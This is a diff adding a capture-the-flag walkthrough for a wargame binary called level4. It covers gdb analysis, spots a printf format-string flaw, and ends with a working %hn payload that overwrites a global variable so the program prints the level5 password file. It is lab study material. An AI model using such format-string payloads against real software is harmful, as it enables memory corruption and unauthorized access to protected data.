@@ -1,0 +1,23 @@
+HOW TO FIND THE FLAG:
+
+First we analyse the binary in gdb -> gdb level4
+
+'info functions' => 3 functions p n and main and use of printf and fgets indicates us maybe a format string vulnerability
+
+'info variables' => m variable with adress 0x08049810
+
+disas main => calls n function
+
+disas n function => we see that there is a buffer of size 512 (p 0x200 = 512)
+
+call to fgets function that reads 512 char from stdin.
+
+Call to p function => disas p => printf the buffer
+
+cmp the variable with the value 0x1025544 (p 0x1025544 = 16930116) -> If the m variable is equal to 16930116 then call to system with "/bin/cat /home/user/level5/.pass" -> We get the password for level5
+
+The goal is to change the value of the m variable thanks to string format vulnerability.
+
+We will use the %n identifier to write to the stack and to the adress pointed by %n
+
+python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn"' | ./level4
